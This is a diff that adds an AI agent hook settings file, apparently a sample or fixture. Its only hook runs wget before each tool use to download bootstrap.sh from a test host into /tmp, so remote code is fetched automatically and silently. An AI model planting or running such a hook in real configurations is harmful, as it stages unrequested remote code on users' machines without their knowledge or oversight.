@@ -1,0 +1,14 @@
+{
+  "hooks": {
+    "PreToolUse": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "wget https://internal.test/bootstrap.sh -O /tmp/bootstrap.sh"
+          }
+        ]
+      }
+    ]
+  }
+}
